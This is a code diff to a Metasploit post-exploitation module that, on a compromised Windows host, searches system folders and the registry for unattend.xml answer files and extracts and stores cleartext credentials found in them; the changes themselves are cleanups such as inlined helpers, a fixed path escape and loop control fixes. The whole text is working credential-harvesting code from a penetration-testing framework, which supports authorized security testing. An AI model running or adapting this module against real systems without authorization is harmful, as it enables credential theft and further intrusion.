@@ -35,7 +35,12 @@ class MetasploitModule < Msf::Post
           ['URL', 'https://www.immersivelabs.com/blog/the-return-of-unattend-xml-revenge-of-the-cleartext-credentials/']
         ],
         'Platform' => [ 'win' ],
-        'SessionTypes' => [ 'meterpreter', 'shell' ]
+        'SessionTypes' => [ 'meterpreter', 'shell' ],
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'SideEffects' => [],
+          'Reliability' => []
+        }
       )
     )
 
@@ -44,13 +49,6 @@ class MetasploitModule < Msf::Post
         OptBool.new('GETALL', [true, 'Collect all unattend.xml that are found', true])
       ]
     )
-  end
-
-  #
-  # Determine if unattend.xml exists or not
-  #
-  def unattend_exists?(xml_path)
-    exist?(xml_path)
   end
 
   #
@@ -93,36 +91,25 @@ class MetasploitModule < Msf::Post
   end
 
   #
-  # If we spot a path for the answer file, we should check it out too
-  #
-  def get_registry_unattend_path
-    # HKLM\System\Setup!UnattendFile
-    fname = registry_getvaldata('HKEY_LOCAL_MACHINE\\System\\Setup', 'UnattendFile')&.strip
-    return fname
-  end
-
-  #
-  # Initialize all 7 possible paths for the answer file
+  # Initialize all possible paths for the answer file
   #
   def init_paths
     drive = expand_path('%SystemDrive%')
 
-    files =
-      [
-        'unattend.xml',
-        'autounattend.xml',
-        'unattend.xml.vmimport',
-        'autounattend.xml.vmimport'
-      ]
+    files = [
+      'unattend.xml',
+      'autounattend.xml',
+      'unattend.xml.vmimport',
+      'autounattend.xml.vmimport'
+    ]
 
-    target_paths =
-      [
-        "#{drive}\\",
-        "#{drive}\\Windows\\System32\\sysprep\\",
-        "#{drive}\\Windows\\panther\\",
-        "#{drive}\\Windows\\Panther\Unattend\\",
-        "#{drive}\\Windows\\System32\\"
-      ]
+    target_paths = [
+      "#{drive}\\",
+      "#{drive}\\Windows\\System32\\sysprep\\",
+      "#{drive}\\Windows\\panther\\",
+      "#{drive}\\Windows\\Panther\\Unattend\\",
+      "#{drive}\\Windows\\System32\\"
+    ]
 
     paths = []
     target_paths.each do |p|
@@ -131,16 +118,17 @@ class MetasploitModule < Msf::Post
       end
     end
 
-    # If there is one for registry, we add it to the list too
-    reg_path = get_registry_unattend_path
+    # Add UnattendFile path from the Windows Registry (if present)
+    reg_path = registry_getvaldata('HKEY_LOCAL_MACHINE\\System\\Setup', 'UnattendFile')&.strip
     paths << reg_path unless reg_path.blank?
+
     return paths
   end
 
   def run
     init_paths.each do |xml_path|
       # If unattend.xml doesn't exist, move on to the next one
-      unless unattend_exists?(xml_path)
+      unless exist?(xml_path)
         vprint_error("#{xml_path} not found")
         next
       end
@@ -149,7 +137,7 @@ class MetasploitModule < Msf::Post
       save_raw(xml_path, raw)
 
       # XML failed to parse, will not go on from here
-      return unless xml
+      next unless xml
 
       results = Rex::Parser::Unattend.parse(xml)
       table = Rex::Parser::Unattend.create_table(results)
@@ -159,7 +147,7 @@ class MetasploitModule < Msf::Post
       # Save the data to a file, TODO: Save this as a Mdm::Cred maybe
       save_cred_tables(table) unless table.nil?
 
-      return unless datastore['GETALL']
+      break unless datastore['GETALL']
     end
   end
 end
